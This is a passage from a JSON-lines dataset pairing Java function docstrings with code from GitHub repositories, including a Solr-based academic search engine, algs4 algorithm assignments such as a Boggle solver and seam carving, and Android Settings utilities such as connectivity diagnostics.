"None", "language": "java", "size": 70815}
{"docstring": "/**\n * \u8ba1\u7b97\u83b7\u5f97\u521d\u59cb\u7684G\u77e9\u9635\n * \n * @param a\n *            \u4e3aalpha\u7684\u503c\uff0c0.85\n * @return \u521d\u59cb\u77e9\u9635G\n */\n", "func_signal": "public static List<List<Double>> getG(double a)", "code": "{\n\tList<List<Double>> aS = numberMulMatrix(s, a);\n\tList<List<Double>> nU = numberMulMatrix(getU(), (1 - a) / SIZE);\n\tList<List<Double>> g = addMatrix(aS, nU);\n\treturn g;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\recommend\\PageRank.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// \u5f97\u5230\u4e00\u4e2a\u5b66\u8005\u7684tag list\n", "func_signal": "public String getAuthorTags(String name)", "code": "{\n\tString tags = \"\";\n\tSolrServer server = client.getSolrServer();\n\tSolrQuery query = new SolrQuery();\n\tquery.setQuery(StringUtil.transformQuery(\"name\", name));\n\tquery.setStart(0);\n\tquery.setRows(1);\n\tQueryResponse rsp;\n\ttry {\n\t\trsp = server.query(query);\n\t\tSolrDocumentList docs = rsp.getResults();\n\t\tIterator<SolrDocument> it = docs.iterator();\n\t\twhile (it.hasNext()) {\n\t\t\tSolrDocument resultDoc = it.next();\n\t\t\ttags = (String)resultDoc.getFieldValue(\"moretags\");\n\t\t\tbreak;\n\t\t}\n\t\t\n\t} catch (SolrServerException e) {\n\t\te.printStackTrace();\n\t}\n\treturn tags;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\solrj\\SolrjHelper.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// \u4f20\u5165title\u91cc\u7684\u5173\u952e\u5b57\uff0c\u5f97\u5230\u4e00\u4e2a\u8bba\u6587\u5217\u8868\n", "func_signal": "public List<String> getPubsByTitle(String text, int start, int rows) throws IOException", "code": "{\n\tList<String> array = new ArrayList<String>();\n\tSolrjClient newclient = new SolrjClient(1);\n\tSolrServer server = newclient.getSolrServer();\n\tSolrQuery query = new SolrQuery();\n\tquery.setQuery(StringUtil.transformQuery(\"title\", text));\n\tquery.setStart(start);\n\tquery.setRows(rows);\n\tQueryResponse rsp;\n\ttry {\n\t\trsp = server.query(query);\n\t\tSolrDocumentList docs = rsp.getResults();\n\t\tIterator<SolrDocument> it = docs.iterator();\n\t\twhile (it.hasNext()) {\n\t\t\tSolrDocument resultDoc = it.next();\n\t\t\tString s = \"\";\n\t\t\ts = s + (String)resultDoc.getFieldValue(\"pub_abstract\");\n\t\t\ts = s + \" \" + (String)resultDoc.getFieldValue(\"title\");\n\t\t\tarray.add(s);\n\t\t}\n\n\t} catch (SolrServerException e) {\n\t\te.printStackTrace();\n\t}\n\treturn array;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\solrj\\SolrjHelper.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "/**\n * \u521d\u59cb\u5316U\u77e9\u9635\uff0c\u51681\n * \n * @return U\n */\n", "func_signal": "public static List<List<Double>> getU()", "code": "{\n\tList<Double> row = new ArrayList<Double>();\n\tfor (int i = 0; i < SIZE; i ++) {\n\t\trow.add(new Double(1));\n\t}\n\n\tList<List<Double>> s = new ArrayList<List<Double>>();\n\tfor (int j = 0; j < SIZE; j ++) {\n\t\ts.add(row);\n\t}\n\treturn s;\n}", "path": "AcademicSearchEngine\\src\\dcd\\academic\\recommend\\PageRank.java", "repo_name": "pelick/VerticleSearchEngine", "stars": 98, "license": "None", "language": "java", "size": 70815}
{"docstring": "// Returns the set of all valid words in the given Boggle board, as an Iterable.\n", "func_signal": "public Iterable<String> getAllValidWords(BoggleBoard board)", "code": "{\n    initializeBoardGraph(board);\n    Set<String> result = new HashSet<String>();\n    for (int v = 0; v < V; v++) {\n        dfs(v, result);\n    }\n    return result;\n}", "path": "assignments\\Boggle\\BoggleSolver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//DEBUG\n", "func_signal": "private static void dump(Queue<Integer> q)", "code": "{\n    int BYTES_PER_LINE = 16;\n    int i;\n    for (i = 0; !q.isEmpty(); i++) {\n        if (i == 0) StdOut.printf(\"\");\n        else if (i % BYTES_PER_LINE == 0) StdOut.printf(\"\\n\", i);\n        else StdOut.print(\" \");\n        StdOut.print(Integer.toHexString(q.dequeue()));\n    }\n    if (BYTES_PER_LINE != 0) StdOut.println();\n    StdOut.println((i * 8) + \" bits\");\n}", "path": "assignments\\burrowswheeler\\MoveToFront.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "// apply move-to-front encoding, reading from standard input and writing to standard output\n", "func_signal": "public static void encode()", "code": "{\n    initEncoding();\n\n    while (!BinaryStdIn.isEmpty()) {\n        char c = BinaryStdIn.readChar();\n        int out = encodings[c];\n        BinaryStdOut.write(out);\n        moveToFront(c);\n    }\n    BinaryStdOut.close();\n}", "path": "assignments\\burrowswheeler\\MoveToFront.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//initialize a 4x4 hasbro board\n", "func_signal": "private void initializeHASBROGraph()", "code": "{\n    HASBRO = (Bag<Integer>[]) new Bag[16];\n    for (int v = 0; v < 16; v++) {\n        HASBRO[v] = new Bag<Integer>();\n        addAdj(HASBRO, v, 4, 4);\n    }\n}", "path": "assignments\\Boggle\\BoggleSolver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//1. add reverse method in EdgeWeightedDigraph class\n", "func_signal": "public Iterable<DirectedEdge> skippablePath(EdgeWeightedDigraph G,int s, int t)", "code": "{\n    DijkstraSP spaths = new DijkstraSP(G, s);\n    DijkstraSP tpaths = new DijkstraSP(G.reverse(), t);\n\n    double min = Double.MAX_VALUE;\n    DirectedEdge skippable = null;\n\n    for (DirectedEdge e : G.edges()) {\n        int v = e.from();\n        int w = e.to();\n        if (spaths.distTo(v) + tpaths.distTo(w) < min) {\n            skippable = e;\n            min = spaths.distTo(v) + tpaths.distTo(w);\n        }\n    }\n\n    Stack<DirectedEdge> skippablepath = new Stack<DirectedEdge>();\n    Stack<DirectedEdge> tmp = new Stack<DirectedEdge>();\n\n    for (DirectedEdge e : tpaths.pathTo(skippable.to())) skippablepath.push(e);\n    skippablepath.push(skippable);\n    for (DirectedEdge e : spaths.pathTo(skippable.from())) tmp.push(e);\n    for (DirectedEdge e : tmp) skippablepath.push(e);\n    return skippablepath;\n}", "path": "jobinterviewquestions\\ShortestPaths.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "// Initializes the data structure using the given array of strings as the dictionary.\n// (You can assume each word in the dictionary contains only the uppercase letters A through Z.)\n", "func_signal": "public BoggleSolver(String[] dictionary)", "code": "{\n    initialize(dictionary);\n    initializeHASBROGraph();\n}", "path": "assignments\\Boggle\\BoggleSolver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "// remove vertical seam from current picture\n", "func_signal": "public    void removeVerticalSeam(int[] seam)", "code": "{\n    width--;\n    for (int i = 0; i < height; i++) {\n        int rm = seam[i];\n        int j = 0;\n        while (j < width) {\n            if (j >= rm) {\n                rgb[i][j] = rgb[i][j + 1];\n                energy[i][j] = energy[i][j + 1];\n            }\n\n            j++;\n        }\n    }\n\n    for (int i = 0; i < height; i++) {\n        int rm = seam[i];\n        setEnergy(i, rm);\n        if (i > 0) setEnergy(i - 1, rm);\n        if (i < width - 1) setEnergy(i + 1, rm);\n        if (rm > 0) setEnergy(i, rm - 1);\n        if (rm < height - 1) setEnergy(i, rm + 1);\n    }\n}", "path": "assignments\\seamcarving\\SeamCarver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//delta value of col x, row y\n", "func_signal": "private double deltaX(int x, int y)", "code": "{\n    int reddiff = getRed(x + 1, y) - getRed(x - 1, y);\n    int greendiff = getGreen(x + 1, y) - getGreen(x - 1, y);\n    int bluediff = getBlue(x + 1, y) - getBlue(x - 1, y);\n    return reddiff*reddiff + greendiff*greendiff + bluediff*bluediff;\n}", "path": "assignments\\seamcarving\\SeamCarver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "// Returns the score of the given word if it is in the dictionary, zero otherwise.\n// (You can assume the word contains only the uppercase letters A through Z.)\n", "func_signal": "public int scoreOf(String word)", "code": "{\n    int len = word.length();\n    if (dictionary.contains(word)) {\n        return scoreOf(len);\n    }\n    return 0;\n}", "path": "assignments\\Boggle\\BoggleSolver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "// sequence of indices for horizontal seam\n", "func_signal": "public int[] findHorizontalSeam()", "code": "{\n    findSP(height, width, false);\n    int[] result = new int[width];\n    for (int v = seamPath[width*height + 1]; v > 0; v = seamPath[v])\n        result[(v - 1) / height] = (v - 1) % height;\n    return result;\n}", "path": "assignments\\seamcarving\\SeamCarver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//DEBUG\n", "func_signal": "public String toString()", "code": "{\n    StringBuilder s = new StringBuilder();\n    String NEWLINE = System.getProperty(\"line.separator\");\n    for (int v = 0; v < V; v++) {\n        s.append(getLetter(v) + \": \");\n        for (int w : adj[v]) {\n            s.append(getLetter(w) + \" \");\n        }\n        s.append(NEWLINE);\n    }\n    return s.toString();\n}", "path": "assignments\\Boggle\\BoggleSolver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//helper function for adding key\n", "func_signal": "private Node addNode(Node x, String key, int d)", "code": "{\n    if (x == null) x = new Node();\n    if (d == key.length()) {\n        if (d > 2)\n            x.isString = true;\n    }\n    else {\n        char c = key.charAt(d);\n        x.next[c - OFFSET] = addNode(x.next[c - OFFSET], key, d + 1);\n    }\n    return x;\n}", "path": "assignments\\Boggle\\BoggleSolver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//DEBUG\n", "func_signal": "private static void encode(String file)", "code": "{\n    initEncoding();\n    BinaryIn bin = new BinaryIn(file);\n    Queue<Integer> output = new Queue<Integer>();\n\n    while (!bin.isEmpty()) {\n        char c = bin.readChar();\n        int out = encodings[c];\n        output.enqueue(out);\n        moveToFront(c);\n    }\n    dump(output);\n}", "path": "assignments\\burrowswheeler\\MoveToFront.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//helper function for dfs and adding result\n", "func_signal": "private void dfs(int s, Set<String> result)", "code": "{\n    //check first char, if not found in trie, return\n    char start = chars[s];\n    Node first = queryNext(root, start);\n    if (first == null) return;\n    //initialize iterator for each vertex in bg\n    Iterator<Integer>[] adj = (Iterator<Integer>[]) new Iterator[V];\n    for (int v = 0; v < V; v++)\n        adj[v] = adjs[v].iterator();\n    //mark visited vertices to avoid cycle\n    boolean[] onTrack = new boolean[V];\n    onTrack[s] = true;\n    //track visited trie node\n    Stack<Node> nodes = new Stack<Node>();\n    nodes.push(first);\n    //track visited vertices\n    Stack<Integer> visited = new Stack<Integer>();\n    visited.push(s);\n    //track visited prefix\n    StringBuilder prefix = new StringBuilder(Character.toString(start));\n\n    //depth first search\n    while (!visited.isEmpty()) {\n        int v = visited.peek();\n        Node n = nodes.peek();\n        if (n != null && n.isString)\n            result.add(prefix.toString());\n\n        if (adj[v].hasNext() && n != null) { //if prefix node exists and vertex has adjacent vertices to go\n            int w = adj[v].next();\n            char cw = chars[w];\n            if (!onTrack[w]) {\n                onTrack[w] = true;\n                visited.push(w);\n                nodes.push(queryNext(n, cw));\n                prefix.append(cw);\n            }\n        }\n        else {\n            visited.pop();\n            nodes.pop();\n            onTrack[v] = false;\n            adj[v] = adjs[v].iterator(); //reset iterator\n            prefix.setLength(prefix.length() - 1); //remove last char from prefix\n        }\n    }\n\n}", "path": "assignments\\Boggle\\BoggleSolver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//initialize board graph given a board\n", "func_signal": "private void initializeBoardGraph(BoggleBoard board)", "code": "{\n    int row = board.rows();\n    int col = board.cols();\n    V = row*col;\n    chars = new char[V];\n    if (row == 4 && col == 4) this.adjs = HASBRO;\n    else {\n        adjs = (Bag<Integer>[]) new Bag[row*col];\n        for (int v = 0; v < V; v++) {\n            adjs[v] = new Bag<Integer>();\n            addAdj(adjs, v, col, row);\n        }\n    }\n\n    for (int v = 0; v < V; v++) {\n        chars[v] = board.getLetter(v/col, v%col);\n    }\n}", "path": "assignments\\Boggle\\BoggleSolver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//helper function for initializing BoggleSolver\n", "func_signal": "private void initialize(String[] dictionary)", "code": "{\n    this.dictionary = new HashSet<String>();\n    for (String d : dictionary) {\n        this.dictionary.add(d);\n        addNode(d);\n    }\n}", "path": "assignments\\Boggle\\BoggleSolver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "//DEBUG function\n", "func_signal": "private Node get(Node x, String key, int d)", "code": "{\n    if (x == null) return null;\n    if (d == key.length()) return x;\n    char c = key.charAt(d);\n    return get(x.next[c - OFFSET], key, d+1);\n}", "path": "assignments\\Boggle\\BoggleSolver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "// if args[0] is '-', apply move-to-front encoding\n// if args[0] is '+', apply move-to-front decoding\n", "func_signal": "public static void main(String[] args)", "code": "{\n    if (args[0].equals(\"-\")) encode();\n    else if (args[0].equals(\"+\")) decode();\n    else throw new IllegalArgumentException(\"Please use - and + to specify encoding or decoding!\");\n\n    //encode(\"./resources/burrowswheeler/abra.txt\");\n    //decode(true);\n}", "path": "assignments\\burrowswheeler\\MoveToFront.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "// sequence of indices for vertical seam\n", "func_signal": "public int[] findVerticalSeam()", "code": "{\n    findSP(width, height, true);\n    int[] result = new int[height];\n    for (int v = seamPath[width*height + 1]; v > 0; v = seamPath[v])\n        result[(v - 1) / width] = (v - 1) % width;\n    return result;\n}", "path": "assignments\\seamcarving\\SeamCarver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "// create a seam carver object based on the given picture\n", "func_signal": "public SeamCarver(Picture picture)", "code": "{\n    this.picture = picture;\n    width = picture.width();\n    height = picture.height();\n\n    setRGB(picture);\n    initEnergy();\n\n}", "path": "assignments\\seamcarving\\SeamCarver.java", "repo_name": "phareskrad/algs4", "stars": 74, "license": "None", "language": "java", "size": 264}
{"docstring": "/**\n * Gets the label associated with a particular account type. If none found, return null.\n * @param accountType the type of account\n * @return a CharSequence for the label or null if one cannot be found.\n */\n", "func_signal": "protected CharSequence getLabelForType(final String accountType)", "code": "{\n    CharSequence label = null;\n    if (mTypeToAuthDescription.containsKey(accountType)) {\n        try {\n            AuthenticatorDescription desc = mTypeToAuthDescription.get(accountType);\n            Context authContext = createPackageContext(desc.packageName, 0);\n            label = authContext.getResources().getText(desc.labelId);\n        } catch (PackageManager.NameNotFoundException e) {\n            Log.w(TAG, \"No label name for account type \" + accountType);\n        } catch (Resources.NotFoundException e) {\n            Log.w(TAG, \"No label resource for account type \" + accountType);\n        }\n    }\n    return label;\n}", "path": "src\\com\\android\\settings\\accounts\\ChooseAccountActivity.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/** Not global warming, it's global change warning. */\n", "func_signal": "public static Dialog buildGlobalChangeWarningDialog(final Context context, int titleResId,\n        final Runnable positiveAction)", "code": "{\n    final AlertDialog.Builder builder = new AlertDialog.Builder(context);\n    builder.setTitle(titleResId);\n    builder.setMessage(R.string.global_change_warning);\n    builder.setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {\n        @Override\n        public void onClick(DialogInterface dialog, int which) {\n            positiveAction.run();\n        }\n    });\n    builder.setNegativeButton(android.R.string.cancel, null);\n\n    return builder.create();\n}", "path": "src\\com\\android\\settings\\Utils.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Prepare a custom preferences layout, moving padding to {@link ListView}\n * when outside scrollbars are requested. Usually used to display\n * {@link ListView} and {@link TabWidget} with correct padding.\n */\n", "func_signal": "public static void prepareCustomPreferencesList(\n        ViewGroup parent, View child, View list, boolean ignoreSidePadding)", "code": "{\n    final boolean movePadding = list.getScrollBarStyle() == View.SCROLLBARS_OUTSIDE_OVERLAY;\n    if (movePadding && parent instanceof PreferenceFrameLayout) {\n        ((PreferenceFrameLayout.LayoutParams) child.getLayoutParams()).removeBorders = true;\n\n        final Resources res = list.getResources();\n        final int paddingSide = res.getDimensionPixelSize(\n                com.android.internal.R.dimen.preference_fragment_padding_side);\n        final int paddingBottom = res.getDimensionPixelSize(\n                com.android.internal.R.dimen.preference_fragment_padding_bottom);\n\n        final int effectivePaddingSide = ignoreSidePadding ? 0 : paddingSide;\n        list.setPaddingRelative(effectivePaddingSide, 0, effectivePaddingSide, paddingBottom);\n    }\n}", "path": "src\\com\\android\\settings\\Utils.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Gets the label associated with a particular account type. If none found, return null.\n * @param accountType the type of account\n * @return a CharSequence for the label or null if one cannot be found.\n */\n", "func_signal": "public CharSequence getLabelForType(Context context, final String accountType)", "code": "{\n    CharSequence label = null;\n    if (mTypeToAuthDescription.containsKey(accountType)) {\n        try {\n            AuthenticatorDescription desc = mTypeToAuthDescription.get(accountType);\n            Context authContext = context.createPackageContext(desc.packageName, 0);\n            label = authContext.getResources().getText(desc.labelId);\n        } catch (PackageManager.NameNotFoundException e) {\n            Log.w(TAG, \"No label name for account type \" + accountType);\n        } catch (Resources.NotFoundException e) {\n            Log.w(TAG, \"No label icon for account type \" + accountType);\n        }\n    }\n    return label;\n}", "path": "src\\com\\android\\settings\\accounts\\AuthenticatorHelper.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Gets an icon associated with a particular account type. If none found, return null.\n * @param accountType the type of account\n * @return a drawable for the icon or null if one cannot be found.\n */\n", "func_signal": "public Drawable getDrawableForType(Context context, final String accountType)", "code": "{\n    Drawable icon = null;\n    if (mAccTypeIconCache.containsKey(accountType)) {\n        return mAccTypeIconCache.get(accountType);\n    }\n    if (mTypeToAuthDescription.containsKey(accountType)) {\n        try {\n            AuthenticatorDescription desc = mTypeToAuthDescription.get(accountType);\n            Context authContext = context.createPackageContext(desc.packageName, 0);\n            icon = authContext.getResources().getDrawable(desc.iconId);\n            mAccTypeIconCache.put(accountType, icon);\n        } catch (PackageManager.NameNotFoundException e) {\n        } catch (Resources.NotFoundException e) {\n        }\n    }\n    if (icon == null) {\n        icon = context.getPackageManager().getDefaultActivityIcon();\n    }\n    return icon;\n}", "path": "src\\com\\android\\settings\\accounts\\AuthenticatorHelper.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Updates provider icons. Subclasses should call this in onCreate()\n * and update any UI that depends on AuthenticatorDescriptions in onAuthDescriptionsUpdated().\n */\n", "func_signal": "private void updateAuthDescriptions()", "code": "{\n    mAuthDescs = AccountManager.get(this).getAuthenticatorTypes();\n    for (int i = 0; i < mAuthDescs.length; i++) {\n        mTypeToAuthDescription.put(mAuthDescs[i].type, mAuthDescs[i]);\n    }\n    onAuthDescriptionsUpdated();\n}", "path": "src\\com\\android\\settings\\accounts\\ChooseAccountActivity.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Returns the WIFI IP Addresses, if any, taking into account IPv4 and IPv6 style addresses.\n * @param context the application context\n * @return the formatted and comma-separated IP addresses, or null if none.\n */\n", "func_signal": "public static String getWifiIpAddresses(Context context)", "code": "{\n    ConnectivityManager cm = (ConnectivityManager)\n            context.getSystemService(Context.CONNECTIVITY_SERVICE);\n    LinkProperties prop = cm.getLinkProperties(ConnectivityManager.TYPE_WIFI);\n    return formatIpAddresses(prop);\n}", "path": "src\\com\\android\\settings\\Utils.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Returns whether the device is voice-capable (meaning, it is also a phone).\n */\n", "func_signal": "public static boolean isVoiceCapable(Context context)", "code": "{\n    TelephonyManager telephony =\n            (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);\n    return telephony != null && telephony.isVoiceCapable();\n}", "path": "src\\com\\android\\settings\\Utils.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Finds a matching activity for a preference's intent. If a matching\n * activity is not found, it will remove the preference. The icon, title and\n * summary of the preference will also be updated with the values retrieved\n * from the activity's meta-data elements. If no meta-data elements are\n * specified then the preference title will be set to match the label of the\n * activity, an icon and summary text will not be displayed.\n *\n * @param context The context.\n * @param parentPreferenceGroup The preference group that contains the\n *            preference whose intent is being resolved.\n * @param preferenceKey The key of the preference whose intent is being\n *            resolved.\n *\n * @return Whether an activity was found. If false, the preference was\n *         removed.\n *\n * @see {@link #META_DATA_PREFERENCE_ICON}\n *      {@link #META_DATA_PREFERENCE_TITLE}\n *      {@link #META_DATA_PREFERENCE_SUMMARY}\n */\n", "func_signal": "public static boolean updatePreferenceToSpecificActivityFromMetaDataOrRemove(Context context,\n        PreferenceGroup parentPreferenceGroup, String preferenceKey)", "code": "{\n\n    Preference preference = parentPreferenceGroup.findPreference(preferenceKey);\n    if (preference == null) {\n        return false;\n    }\n\n    Intent intent = preference.getIntent();\n    if (intent != null) {\n        // Find the activity that is in the system image\n        PackageManager pm = context.getPackageManager();\n        List<ResolveInfo> list = pm.queryIntentActivities(intent, PackageManager.GET_META_DATA);\n        int listSize = list.size();\n        for (int i = 0; i < listSize; i++) {\n            ResolveInfo resolveInfo = list.get(i);\n            if ((resolveInfo.activityInfo.applicationInfo.flags\n                    & ApplicationInfo.FLAG_SYSTEM) != 0) {\n                Drawable icon = null;\n                String title = null;\n                String summary = null;\n\n                // Get the activity's meta-data\n                try {\n                    Resources res = pm\n                            .getResourcesForApplication(resolveInfo.activityInfo.packageName);\n                    Bundle metaData = resolveInfo.activityInfo.metaData;\n\n                    if (res != null && metaData != null) {\n                        if (preference instanceof IconPreferenceScreen) {\n                            icon = res.getDrawable(metaData.getInt(META_DATA_PREFERENCE_ICON));\n                        }\n                        title = res.getString(metaData.getInt(META_DATA_PREFERENCE_TITLE));\n                        summary = res.getString(metaData.getInt(META_DATA_PREFERENCE_SUMMARY));\n                    }\n                } catch (NameNotFoundException e) {\n                    // Ignore\n                } catch (NotFoundException e) {\n                    // Ignore\n                }\n\n                // Set the preference title to the activity's label if no\n                // meta-data is found\n                if (TextUtils.isEmpty(title)) {\n                    title = resolveInfo.loadLabel(pm).toString();\n                }\n\n                // Set icon, title and summary for the preference\n                preference.setTitle(title);\n                preference.setSummary(summary);\n                if (preference instanceof IconPreferenceScreen) {\n                    IconPreferenceScreen iconPreference = (IconPreferenceScreen) preference;\n                    iconPreference.setIcon(icon);\n                }\n\n                // Replace the intent with this specific activity\n                preference.setIntent(new Intent().setClassName(\n                        resolveInfo.activityInfo.packageName,\n                        resolveInfo.activityInfo.name));\n\n               return true;\n            }\n        }\n    }\n\n    // Did not find a matching activity, so remove the preference\n    parentPreferenceGroup.removePreference(preference);\n\n    return false;\n}", "path": "src\\com\\android\\settings\\Utils.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Gets an icon associated with a particular account type. If none found, return null.\n * @param accountType the type of account\n * @return a drawable for the icon or null if one cannot be found.\n */\n", "func_signal": "protected Drawable getDrawableForType(final String accountType)", "code": "{\n    Drawable icon = null;\n    if (mTypeToAuthDescription.containsKey(accountType)) {\n        try {\n            AuthenticatorDescription desc = mTypeToAuthDescription.get(accountType);\n            Context authContext = createPackageContext(desc.packageName, 0);\n            icon = authContext.getResources().getDrawable(desc.iconId);\n        } catch (PackageManager.NameNotFoundException e) {\n            // TODO: place holder icon for missing account icons?\n            Log.w(TAG, \"No icon name for account type \" + accountType);\n        } catch (Resources.NotFoundException e) {\n            // TODO: place holder icon for missing account icons?\n            Log.w(TAG, \"No icon resource for account type \" + accountType);\n        }\n    }\n    return icon;\n}", "path": "src\\com\\android\\settings\\accounts\\ChooseAccountActivity.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "// Returns the current state of the system property that controls\n// strictmode flashes.  One of:\n//    0: not explicitly set one way or another\n//    1: on\n//    2: off\n", "func_signal": "private static int currentStrictModeActiveIndex()", "code": "{\n    if (TextUtils.isEmpty(SystemProperties.get(StrictMode.VISUAL_PROPERTY))) {\n        return 0;\n    }\n    boolean enabled = SystemProperties.getBoolean(StrictMode.VISUAL_PROPERTY, false);\n    return enabled ? 1 : 2;\n}", "path": "src\\com\\android\\settings\\DevelopmentSettings.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/* Used by UserSettings as well. Call this on a non-ui thread. */\n", "func_signal": "public static boolean copyMeProfilePhoto(Context context, UserInfo user)", "code": "{\n    Uri contactUri = Profile.CONTENT_URI;\n\n    InputStream avatarDataStream = Contacts.openContactPhotoInputStream(\n                context.getContentResolver(),\n                contactUri, true);\n    // If there's no profile photo, assign a default avatar\n    if (avatarDataStream == null) {\n        return false;\n    }\n    int userId = user != null ? user.id : UserHandle.myUserId();\n    UserManager um = (UserManager) context.getSystemService(Context.USER_SERVICE);\n    Bitmap icon = BitmapFactory.decodeStream(avatarDataStream);\n    um.setUserIcon(userId, icon);\n    try {\n        avatarDataStream.close();\n    } catch (IOException ioe) { }\n    return true;\n}", "path": "src\\com\\android\\settings\\Utils.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * Return string resource that best describes combination of tethering\n * options available on this device.\n */\n", "func_signal": "public static int getTetheringLabel(ConnectivityManager cm)", "code": "{\n    String[] usbRegexs = cm.getTetherableUsbRegexs();\n    String[] wifiRegexs = cm.getTetherableWifiRegexs();\n    String[] bluetoothRegexs = cm.getTetherableBluetoothRegexs();\n\n    boolean usbAvailable = usbRegexs.length != 0;\n    boolean wifiAvailable = wifiRegexs.length != 0;\n    boolean bluetoothAvailable = bluetoothRegexs.length != 0;\n\n    if (wifiAvailable && usbAvailable && bluetoothAvailable) {\n        return R.string.tether_settings_title_all;\n    } else if (wifiAvailable && usbAvailable) {\n        return R.string.tether_settings_title_all;\n    } else if (wifiAvailable && bluetoothAvailable) {\n        return R.string.tether_settings_title_all;\n    } else if (wifiAvailable) {\n        return R.string.tether_settings_title_wifi;\n    } else if (usbAvailable && bluetoothAvailable) {\n        return R.string.tether_settings_title_usb_bluetooth;\n    } else if (usbAvailable) {\n        return R.string.tether_settings_title_usb;\n    } else {\n        return R.string.tether_settings_title_bluetooth;\n    }\n}", "path": "src\\com\\android\\settings\\Utils.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n * This function checks for basic functionality of HTTP Client.\n */\n", "func_signal": "private void httpClientTest()", "code": "{\n    HttpClient client = new DefaultHttpClient();\n    try {\n        HttpGet request = new HttpGet(\"http://www.google.com\");\n        HttpResponse response = client.execute(request);\n        if (response.getStatusLine().getStatusCode() == 200) {\n            mHttpClientTestResult = \"Pass\";\n        } else {\n            mHttpClientTestResult = \"Fail: Code: \" + String.valueOf(response);\n        }\n        request.abort();\n    } catch (IOException e) {\n        mHttpClientTestResult = \"Fail: IOException\";\n    }\n}", "path": "src\\com\\android\\settings\\RadioInfo.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
{"docstring": "/**\n *  Ping a host name\n */\n", "func_signal": "private final void pingHostname()", "code": "{\n    try {\n        Process p = Runtime.getRuntime().exec(\"ping -c 1 www.google.com\");\n        int status = p.waitFor();\n        if (status == 0) {\n            mPingHostnameResult = \"Pass\";\n        } else {\n            mPingHostnameResult = \"Fail: Host unreachable\";\n        }\n    } catch (UnknownHostException e) {\n        mPingHostnameResult = \"Fail: Unknown Host\";\n    } catch (IOException e) {\n        mPingHostnameResult= \"Fail: IOException\";\n    } catch (InterruptedException e) {\n        mPingHostnameResult = \"Fail: InterruptedException\";\n    }\n}", "path": "src\\com\\android\\settings\\RadioInfo.java", "repo_name": "hushnymous/android_packages_apps_Settings", "stars": 80, "license": "other", "language": "java", "size": 197716}
